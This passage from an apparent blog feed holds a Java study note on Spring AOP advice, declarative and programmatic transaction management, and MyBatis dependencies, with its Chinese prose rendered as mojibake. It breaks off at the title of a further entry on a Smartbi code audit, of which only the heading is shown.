&lt;!--é€šçŸ¥--&gt;<br>      &lt;aop:before pointcut-ref=<span class="hljs-string">&quot;diyPonitcut&quot;</span> method=<span class="hljs-string">&quot;before&quot;</span>/&gt;<br>      &lt;aop:after pointcut-ref=<span class="hljs-string">&quot;diyPonitcut&quot;</span> method=<span class="hljs-string">&quot;after&quot;</span>/&gt;<br>    &lt;/aop:aspect&gt;<br>  &lt;/aop:config&gt;<br><br><br>&lt;/beans&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749050.png" alt="img"></p><h5 id="ç¬¬ä¸‰ç§æ–¹å¼ï¼š-ä½¿ç”¨æ³¨è§£å®ç°"><a href="#ç¬¬ä¸‰ç§æ–¹å¼ï¼š-ä½¿ç”¨æ³¨è§£å®ç°" class="headerlink" title="ç¬¬ä¸‰ç§æ–¹å¼ï¼š ä½¿ç”¨æ³¨è§£å®ç°"></a>ç¬¬ä¸‰ç§æ–¹å¼ï¼š ä½¿ç”¨æ³¨è§£å®ç°</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.diy;<br><br><span class="hljs-keyword">import</span> org.aspectj.lang.ProceedingJoinPoint;<br><span class="hljs-keyword">import</span> org.aspectj.lang.annotation.After;<br><span class="hljs-keyword">import</span> org.aspectj.lang.annotation.Around;<br><span class="hljs-keyword">import</span> org.aspectj.lang.annotation.Aspect;<br><span class="hljs-keyword">import</span> org.aspectj.lang.annotation.Before;<br><br><span class="hljs-comment">//æ ‡æ³¨è¿™ä¸ªç±»æ˜¯ä¸€ä¸ªåˆ‡é¢</span><br><span class="hljs-meta">@Aspect</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AnnotationPointCut</span> &#123;<br><br>    <span class="hljs-meta">@Before(&quot;execution(* com.kuang.service.UserServiceImpl.*(..))&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;========æ–¹æ³•æ‰§è¡Œå‰========&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@After(&quot;execution(* com.kuang.service.UserServiceImpl.*(..))&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">after</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;========æ–¹æ³•æ‰§è¡Œå========&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//åœ¨ç¯ç»•å¢å¼ºä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç»™å®šä¸€ä¸ªå‚æ•°ï¼Œä»£è¡¨æˆ‘ä»¬è¦è·å–å¤„ç†åˆ‡å…¥çš„ç‚¹</span><br>    <span class="hljs-meta">@Around(&quot;execution(* com.kuang.service.UserServiceImpl.*(..))&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">around</span><span class="hljs-params">(ProceedingJoinPoint jp)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        System.out.println(<span class="hljs-string">&quot;ç¯ç»•å‰&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proceed</span> <span class="hljs-operator">=</span> jp.proceed();<br>        System.out.println(<span class="hljs-string">&quot;ç¯ç»•å&quot;</span>);<br>    &#125;<br>&#125;<br>&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;beans xmlns=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span><br>  xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>  xmlns:aop=<span class="hljs-string">&quot;http://www.springframework.org/schema/aop&quot;</span><br>  xsi:schemaLocation=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span><br><span class="hljs-string">  http://www.springframework.org/schema/beans/spring-beans.xsd</span><br><span class="hljs-string">  http://www.springframework.org/schema/aop</span><br><span class="hljs-string">  http://www.springframework.org/schema/aop/spring-aop.xsd&quot;</span>&gt;<br>  &lt;!--æ–¹å¼ä¸‰--&gt;<br>  &lt;bean id=<span class="hljs-string">&quot;annotationPointcut&quot;</span> class=<span class="hljs-string">&quot;com.kuang.diy.AnnotationPointCut&quot;</span>/&gt;<br>  &lt;!--å¼€å¯æ³¨è§£æ”¯æŒ--&gt;<br>  &lt;aop:aspectj-autoproxy/&gt;<br>&lt;/beans&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749165.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311753944.png" alt="img"></p><h1 id="5ã€æ•´åˆ-Mybatisï¼ˆæš‚æ—¶è·³è¿‡ï¼‰"><a href="#5ã€æ•´åˆ-Mybatisï¼ˆæš‚æ—¶è·³è¿‡ï¼‰" class="headerlink" title="5ã€æ•´åˆ Mybatisï¼ˆæš‚æ—¶è·³è¿‡ï¼‰"></a>5ã€æ•´åˆ Mybatisï¼ˆæš‚æ—¶è·³è¿‡ï¼‰</h1><h3 id="5-1-1-å¯¼å…¥ç›¸å…³-jar-åŒ…"><a href="#5-1-1-å¯¼å…¥ç›¸å…³-jar-åŒ…" class="headerlink" title="5.1.1 å¯¼å…¥ç›¸å…³ jar åŒ…"></a>5.1.1 å¯¼å…¥ç›¸å…³ jar åŒ…</h3><p>(ç‰ˆæœ¬å¯ä»¥æ ¹æ®æœ€æ–°ç‰ˆè°ƒæ•´)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.1.47<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-webmvc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.1.10.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-jdbc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.1.10.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.aspectj/aspectjweaver --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.aspectj<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aspectjweaver<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-spring<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="6ã€å£°æ˜å¼äº‹åŠ¡"><a href="#6ã€å£°æ˜å¼äº‹åŠ¡" class="headerlink" title="6ã€å£°æ˜å¼äº‹åŠ¡"></a>6ã€å£°æ˜å¼äº‹åŠ¡</h1><h2 id="6-1-å›é¡¾äº‹åŠ¡"><a href="#6-1-å›é¡¾äº‹åŠ¡" class="headerlink" title="6.1 å›é¡¾äº‹åŠ¡"></a>6.1 å›é¡¾äº‹åŠ¡</h2><p><strong>äº‹åŠ¡æ˜¯é€»è¾‘ä¸Šçš„ä¸€ç»„æ“ä½œï¼Œè¦ä¹ˆéƒ½æ‰§è¡Œï¼Œè¦ä¹ˆéƒ½ä¸æ‰§è¡Œ</strong></p><ul><li>æŠŠä¸€ç»„ä¸šåŠ¡å½“æˆä¸€ä¸ªä¸šåŠ¡æ¥åšï¼Œ<strong>è¦ä¹ˆéƒ½æˆåŠŸï¼Œè¦ä¹ˆéƒ½å¤±è´¥</strong>ã€‚</li><li>äº‹åŠ¡åœ¨é¡¹ç›®å¼€å‘è¿‡ç¨‹éå¸¸é‡è¦ï¼Œæ¶‰åŠåˆ°æ•°æ®çš„ä¸€è‡´æ€§çš„é—®é¢˜ï¼Œä¸å®¹é©¬è™ï¼</li><li>äº‹åŠ¡ç®¡ç†æ˜¯ä¼ä¸šçº§åº”ç”¨ç¨‹åºå¼€å‘ä¸­å¿…å¤‡æŠ€æœ¯ï¼Œç”¨æ¥ç¡®ä¿æ•°æ®çš„å®Œæ•´æ€§å’Œä¸€è‡´æ€§ã€‚</li></ul><p><strong>äº‹åŠ¡ ACID åŸåˆ™</strong></p><ol><li>åŸå­æ€§ï¼ˆatomicityï¼‰</li></ol><ul><li><ul><li>äº‹åŠ¡æ˜¯åŸå­æ€§æ“ä½œï¼Œç”±ä¸€ç³»åˆ—åŠ¨ä½œç»„æˆï¼Œäº‹åŠ¡çš„åŸå­æ€§ç¡®ä¿åŠ¨ä½œè¦ä¹ˆå…¨éƒ¨å®Œæˆï¼Œè¦ä¹ˆå®Œå…¨ä¸èµ·ä½œç”¨</li></ul></li></ul><ol><li>ä¸€è‡´æ€§ï¼ˆconsistencyï¼‰</li></ol><ul><li><ul><li>ä¸€æ—¦æ‰€æœ‰äº‹åŠ¡åŠ¨ä½œå®Œæˆï¼Œäº‹åŠ¡å°±è¦è¢«æäº¤ã€‚æ•°æ®å’Œèµ„æºå¤„äºä¸€ç§æ»¡è¶³ä¸šåŠ¡è§„åˆ™çš„ä¸€è‡´æ€§çŠ¶æ€ä¸­</li></ul></li></ul><ol><li>éš”ç¦»æ€§ï¼ˆisolationï¼‰</li></ol><ul><li><ul><li>å¯èƒ½å¤šä¸ªäº‹åŠ¡ä¼šåŒæ—¶å¤„ç†ç›¸åŒçš„æ•°æ®ï¼Œå› æ­¤æ¯ä¸ªäº‹åŠ¡éƒ½åº”è¯¥ä¸å…¶ä»–äº‹åŠ¡éš”ç¦»å¼€æ¥ï¼Œé˜²æ­¢æ•°æ®æŸå</li></ul></li></ul><ol><li>æŒä¹…æ€§ï¼ˆdurabilityï¼‰</li></ol><ul><li><ul><li>äº‹åŠ¡ä¸€æ—¦å®Œæˆï¼Œæ— è®ºç³»ç»Ÿå‘ç”Ÿä»€ä¹ˆé”™è¯¯ï¼Œç»“æœéƒ½ä¸ä¼šå—åˆ°å½±å“ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œäº‹åŠ¡çš„ç»“æœè¢«å†™åˆ°æŒä¹…åŒ–å­˜å‚¨å™¨ä¸­</li></ul></li></ul><p> <strong>Aã€Iã€D æ˜¯æ‰‹æ®µï¼ŒC æ˜¯ç›®çš„ï¼</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749286.png" alt="img"></p><h2 id="6-2-Springä¸­çš„äº‹åŠ¡ç®¡ç†"><a href="#6-2-Springä¸­çš„äº‹åŠ¡ç®¡ç†" class="headerlink" title="6.2 Springä¸­çš„äº‹åŠ¡ç®¡ç†"></a>6.2 Springä¸­çš„äº‹åŠ¡ç®¡ç†</h2><h3 id="6-2-1-Spring-æ”¯æŒçš„ä¿©ç§äº‹åŠ¡ç®¡ç†æ–¹å¼"><a href="#6-2-1-Spring-æ”¯æŒçš„ä¿©ç§äº‹åŠ¡ç®¡ç†æ–¹å¼" class="headerlink" title="6.2.1 Spring æ”¯æŒçš„ä¿©ç§äº‹åŠ¡ç®¡ç†æ–¹å¼"></a>6.2.1 Spring æ”¯æŒçš„ä¿©ç§äº‹åŠ¡ç®¡ç†æ–¹å¼</h3><h4 id="ç¼–ç¨‹å¼äº‹åŠ¡ç®¡ç†"><a href="#ç¼–ç¨‹å¼äº‹åŠ¡ç®¡ç†" class="headerlink" title="ç¼–ç¨‹å¼äº‹åŠ¡ç®¡ç†"></a>ç¼–ç¨‹å¼äº‹åŠ¡ç®¡ç†</h4><p> åœ¨ä»£ç ä¸­æ‰‹åŠ¨æ§åˆ¶äº‹åŠ¡çš„å¼€å¯ã€æäº¤å’Œå›æ»šï¼Œçµæ´»ä½†è€¦åˆä¸šåŠ¡ä»£ç å’Œäº‹åŠ¡é€»è¾‘</p><p>ä½¿ç”¨<code>TransactionTemplate</code> è¿›è¡Œç¼–ç¨‹å¼äº‹åŠ¡ç®¡ç†çš„ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Autowired</span><br><span class="hljs-keyword">private</span> TransactionTemplate transactionTemplate;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testTransaction</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">//è°ƒç”¨ transactionTemplate.execute() å¼€å§‹äº‹åŠ¡æ‰§è¡Œ</span><br>        transactionTemplate.execute(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransactionCallbackWithoutResult</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-comment">//ä¼ å…¥å›è°ƒ TransactionCallbackWithoutResultï¼Œå›è°ƒä¸­å†™ä¸šåŠ¡é€»è¾‘ï¼ŒtransactionStatus å¯¹è±¡è¡¨ç¤ºå½“å‰äº‹åŠ¡çš„çŠ¶æ€ï¼Œå¯ä»¥ç”¨æ¥è®¾ç½®å›æ»š</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doInTransactionWithoutResult</span><span class="hljs-params">(TransactionStatus transactionStatus)</span> &#123;<br><br>                <span class="hljs-keyword">try</span> &#123;<br><br>                    <span class="hljs-comment">// ....  ä¸šåŠ¡ä»£ç </span><br>                &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                    <span class="hljs-comment">//å›æ»š</span><br>                    <span class="hljs-comment">//å¦‚æœå‡ºç°å¼‚å¸¸ï¼Œè°ƒç”¨ transactionStatus.setRollbackOnly()ï¼Œæ ‡è®°äº‹åŠ¡ä¸ºå›æ»šçŠ¶æ€</span><br>                    transactionStatus.setRollbackOnly();<br>                &#125;<br><br>            &#125;<br>        &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>TransactionManager</code> è¿›è¡Œç¼–ç¨‹å¼äº‹åŠ¡ç®¡ç†çš„ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Autowired</span><br><span class="hljs-comment">//PlatformTransactionManager å¯ä»¥æ‰‹åŠ¨å¼€å¯ã€æäº¤ã€å›æ»šäº‹åŠ¡</span><br><span class="hljs-keyword">private</span> PlatformTransactionManager transactionManager;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testTransaction</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">//è°ƒç”¨ getTransaction() å¼€å¯ä¸€ä¸ªäº‹åŠ¡ï¼Œè¿”å›äº‹åŠ¡çŠ¶æ€å¯¹è±¡ statusã€‚</span><br>    <span class="hljs-comment">//DefaultTransactionDefinition() æ˜¯äº‹åŠ¡é…ç½®ï¼Œè¿™é‡Œä½¿ç”¨é»˜è®¤å€¼ï¼šä¼ æ’­è¡Œä¸ºï¼šPROPAGATION_REQUIREDï¼›éš”ç¦»çº§åˆ«ï¼šISOLATION_DEFAULT</span><br>    <span class="hljs-type">TransactionStatus</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> transactionManager.getTransaction(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultTransactionDefinition</span>());<br>          <span class="hljs-keyword">try</span> &#123;<br>               <span class="hljs-comment">// ....  ä¸šåŠ¡ä»£ç </span><br>              <span class="hljs-comment">//æ‰§è¡ŒæˆåŠŸ-è°ƒç”¨ transactionManager.commit(status) æäº¤äº‹åŠ¡</span><br>              transactionManager.commit(status);<br>          &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>              <span class="hljs-comment">//æ•è·å¼‚å¸¸-è°ƒç”¨ transactionManager.rollback(status) å›æ»šäº‹åŠ¡</span><br>              transactionManager.rollback(status);<br>          &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="å£°æ˜å¼äº‹åŠ¡ç®¡ç†"><a href="#å£°æ˜å¼äº‹åŠ¡ç®¡ç†" class="headerlink" title="å£°æ˜å¼äº‹åŠ¡ç®¡ç†"></a>å£°æ˜å¼äº‹åŠ¡ç®¡ç†</h4><p>ä½¿ç”¨<code>@Transactional</code>æ³¨è§£æˆ– XML é…ç½®ï¼Œ Spring AOP è‡ªåŠ¨ç®¡ç†äº‹åŠ¡  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//å£°æ˜å¼äº‹åŠ¡æ³¨è§£</span><br><span class="hljs-comment">//propagation = Propagation.REQUIREDï¼šå½“å‰æ–¹æ³•æœ‰äº‹åŠ¡åˆ™åŠ å…¥è¯¥äº‹åŠ¡ï¼›å¦‚æœå½“å‰æ–¹æ³•æ²¡æœ‰äº‹åŠ¡ï¼Œåˆ™æ–°å»ºä¸€ä¸ªäº‹åŠ¡ã€‚</span><br><span class="hljs-meta">@Transactional(propagation = Propagation.REQUIRED)</span><br><span class="hljs-comment">//ä¸šåŠ¡æ–¹æ³•</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> aMethod &#123;<br>  <span class="hljs-comment">//do something</span><br>  <span class="hljs-comment">//åˆ›å»ºä¸¤ä¸ªå¯¹è±¡ b å’Œ c</span><br>  <span class="hljs-type">B</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>  <span class="hljs-type">C</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">C</span>();<br>  <span class="hljs-comment">//è°ƒç”¨ B å’Œ C çš„æ–¹æ³•</span><br>  b.bMethod();<br>  c.cMethod();<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>spring</strong> <strong>7ç§äº‹åŠ¡ä¼ æ’­è¡Œä¸º</strong><strong>ï¼š</strong></p><ul><li>propagation_requierdï¼šå¦‚æœå½“å‰æ²¡æœ‰äº‹åŠ¡ï¼Œå°±æ–°å»ºä¸€ä¸ªäº‹åŠ¡ï¼Œå¦‚æœå·²å­˜åœ¨ä¸€ä¸ªäº‹åŠ¡ä¸­ï¼ŒåŠ å…¥åˆ°è¿™ä¸ªäº‹åŠ¡ä¸­ï¼Œè¿™æ˜¯æœ€å¸¸è§çš„é€‰æ‹©ã€‚</li><li>propagation_supportsï¼šæ”¯æŒå½“å‰äº‹åŠ¡ï¼Œå¦‚æœæ²¡æœ‰å½“å‰äº‹åŠ¡ï¼Œå°±ä»¥éäº‹åŠ¡æ–¹æ³•æ‰§è¡Œã€‚</li><li>propagation_mandatoryï¼šä½¿ç”¨å½“å‰äº‹åŠ¡ï¼Œå¦‚æœæ²¡æœ‰å½“å‰äº‹åŠ¡ï¼Œå°±æŠ›å‡ºå¼‚å¸¸ã€‚</li><li>propagation_required_newï¼šæ–°å»ºäº‹åŠ¡ï¼Œå¦‚æœå½“å‰å­˜åœ¨äº‹åŠ¡ï¼ŒæŠŠå½“å‰äº‹åŠ¡æŒ‚èµ·ã€‚</li><li>propagation_not_supportedï¼šä»¥éäº‹åŠ¡æ–¹å¼æ‰§è¡Œæ“ä½œï¼Œå¦‚æœå½“å‰å­˜åœ¨äº‹åŠ¡ï¼Œå°±æŠŠå½“å‰äº‹åŠ¡æŒ‚èµ·ã€‚</li><li>propagation_neverï¼šä»¥éäº‹åŠ¡æ–¹å¼æ‰§è¡Œæ“ä½œï¼Œå¦‚æœå½“å‰äº‹åŠ¡å­˜åœ¨åˆ™æŠ›å‡ºå¼‚å¸¸ã€‚</li><li>propagation_nestedï¼šå¦‚æœå½“å‰å­˜åœ¨äº‹åŠ¡ï¼Œåˆ™åœ¨åµŒå¥—äº‹åŠ¡å†…æ‰§è¡Œã€‚å¦‚æœå½“å‰æ²¡æœ‰äº‹åŠ¡ï¼Œåˆ™æ‰§è¡Œä¸propagation_requiredç±»ä¼¼çš„æ“ä½œ</li></ul><p>Spring é»˜è®¤çš„äº‹åŠ¡ä¼ æ’­è¡Œä¸ºæ˜¯ PROPAGATION_REQUIREDï¼Œå®ƒé€‚åˆäºç»å¤§å¤šæ•°çš„æƒ…å†µã€‚</p><p><strong>ä½¿ç”¨Springç®¡ç†äº‹åŠ¡ï¼Œæ³¨æ„å¤´æ–‡ä»¶çš„çº¦æŸå¯¼å…¥ : tx</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot;<br><br>http://www.springframework.org/schema/tx<br>http://www.springframework.org/schema/tx/spring-tx.xsd&quot;&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java å­¦ä¹ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Smartbi v8.5 ä»£ç å®¡è®¡</title>
    <link href="/2025/08/07/Smartbi%20v8.5%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/08/07/Smartbi%20v8.5%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="Smartbi-v8-5-ä»£ç å®¡è®¡"><a href="#Smartbi-v8-5-ä»£ç å®¡è®¡" class="headerlink" title="Smartbi v8.5 ä»£ç å®¡è®¡"></a>Smartbi v8.5 ä»£ç å®¡è®¡</h1><h1 id="ç›®å½•ç»“æ„"><a href="#ç›®å½•ç»“æ„" class="headerlink" title="ç›®å½•ç»“æ„"></a>ç›®å½•ç»“æ„</h1><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs 